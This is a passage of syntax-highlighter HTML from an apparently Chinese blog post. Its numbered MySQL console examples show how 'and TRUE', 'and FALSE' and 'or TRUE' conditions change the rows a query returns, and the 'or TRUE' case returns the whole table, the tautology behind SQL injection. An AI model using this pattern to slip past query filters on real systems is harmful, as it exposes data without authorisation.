&lt;span class=&quot;crayon-v&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;SELECT *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;students &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;where &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10056&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c326d965948521-2&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c326d965948521-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c326d965948521-4&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c326d965948521-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10056&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Doris&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c326d965948521-6&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c326d965948521-7&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;row &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0022 seconds] --&gt;
&lt;p&gt;4)&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c3270907689295&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
mysql&amp;gt; select * from students where id = 10056 and FALSE ;
Empty set (0.00 sec)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3270907689295-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3270907689295-2&quot;&gt;2&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3270907689295-1&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;select *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;students &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;where &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10056&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3270907689295-2&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;Empty &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0009 seconds] --&gt;
&lt;p&gt;5)&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c3273940410866&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
mysql&amp;gt; selcet * from students where id = 10056 or TRUE ;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
| 10058 | Jaune |  22 |
| 10060 | Alisa |  29 |
+-------+-------+-----+
3 rows in set (0.00 sec)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3273940410866-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3273940410866-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3273940410866-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3273940410866-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3273940410866-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3273940410866-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3273940410866-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3273940410866-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3273940410866-9&quot;&gt;9&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3273940410866-1&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;selcet *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;students &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;where &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10056&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3273940410866-2&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3273940410866-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3273940410866-4&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3273940410866-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10056&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Doris&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3273940410866-6&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10058&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Jaune&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3273940410866-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10060&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Alisa&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3273940410866-8&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3273940410866-9&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;rows &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0025 seconds] --&gt;
&lt;p&gt;6)&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c3275707838647&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
